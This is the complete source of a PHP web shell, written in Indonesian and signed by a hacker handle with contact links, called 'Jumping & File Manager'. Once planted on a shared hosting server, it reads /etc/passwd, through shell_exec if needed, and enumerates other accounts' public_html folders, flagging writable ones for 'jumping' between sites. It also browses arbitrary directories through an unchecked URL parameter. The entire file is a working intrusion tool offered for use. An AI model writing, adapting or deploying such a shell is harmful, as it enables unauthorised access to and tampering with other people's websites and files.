<?php

/**
 * JUMPING & FILE MANAGER
 * by L4663r666h05t
 * t.me/laggergod
 * x.com/L4663r666h05t
 * umbra.by/L4663r666h05t
 */

error_reporting(0);
set_time_limit(0);

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir);

function status_label($text, $color) {
    return "<span style='padding: 2px 5px; background: $color; color: #white; border-radius: 3px; font-weight: bold;'>$text</span>";
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .container { background: #262626; border: 1px solid #444; padding: 15px; border-radius: 5px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
        a { color: #00bcff; text-decoration: none; }
        a:hover { color: #fff; text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th { background: #333; color: #fff; padding: 10px; text-align: left; }
        td { padding: 8px; border-bottom: 1px solid #444; }
        .scroll-box { max-height: 250px; overflow-y: auto; background: #000; padding: 10px; border: 1px solid #555; margin-bottom: 20px; }
        .info-bar { margin-bottom: 15px; border-left: 5px solid #00ff00; padding-left: 10px; }
    </style>
</head>
<body>

<div class="container">
    <h1>Jumping & File Manager</h1>
    
    <div class="info-bar">
        <b>System:</b> <?php echo php_uname(); ?><br>
        <b>User:</b> <?php echo get_current_user(); ?> (id: <?php echo getmyuid(); ?>)<br>
        <b>Open_basedir:</b> <?php echo (ini_get('open_basedir') ? ini_get('open_basedir') : "OFF"); ?>
    </div>

    <hr>

    <h3>1. Jumping (Kamar Scanning)</h3>
    <div class="scroll-box">
        <?php
        $users = [];
        $passwd = @file("/etc/passwd");
        if (!$passwd) {
            $passwd = explode("\n", @shell_exec("cat /etc/passwd"));
        }

        foreach ($passwd as $line) {
            $ex = explode(":", $line);
            if (isset($ex[0]) && !empty($ex[0])) $users[] = $ex[0];
        }

        $count = 0;
        foreach (array_unique($users) as $u) {
            // Filter user sistem agar tidak memenuhi layar
            if (in_array($u, ['bin', 'daemon', 'mail', 'nobody', 'systemd-network'])) continue;

            $path = "/home/$u/public_html";
            if (@is_dir($path)) {
                $perm = is_writable($path) ? status_label("[RW]", "green") : status_label("[R]", "blue");
                echo "$perm <a href='?dir=$path'>$path</a><br>";
                $count++;
            }
        }
        if ($count == 0) echo "Tidak ditemukan kamar yang terbuka.";
        ?>
    </div>

    <hr>

    <h3>2. File Manager</h3>
    <b>Current:</b> <?php echo $current_dir; ?>
    
    <table>
        <thead>
            <tr>
                <th>Nama</th>
                <th>Tipe</th>
                <th>Izin</th>
                <th>Aksi</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><a href="?dir=<?php echo dirname($current_dir); ?>">.. [ Kembali ]</a></td>
                <td>Folder</td>
                <td>-</td>
                <td>-</td>
            </tr>
            <?php
            $files = @scandir($current_dir);
            if ($files) {
                foreach ($files as $file) {
                    if ($file == "." || $file == "..") continue;
                    $full = $current_dir . DIRECTORY_SEPARATOR . $file;
                    $isDir = is_dir($full);
                    $p = substr(sprintf('%o', fileperms($full)), -4);
                    
                    echo "<tr>";
                    echo "<td>" . ($isDir ? "<b>[ $file ]</b>" : $file) . "</td>";
                    echo "<td>" . ($isDir ? "DIR" : "FILE") . "</td>";
                    echo "<td>$p</td>";
                    echo "<td><a href='?dir=$full'>" . ($isDir ? "Buka" : "Lihat") . "</a></td>";
                    echo "</tr>";
                }
            } else {
                echo "<tr><td colspan='4' style='color:red;'>Gagal membaca direktori (Permission Denied / open_basedir)</td></tr>";
            }
            ?>
        </tbody>
    </table>
</div>

</body>
</html>
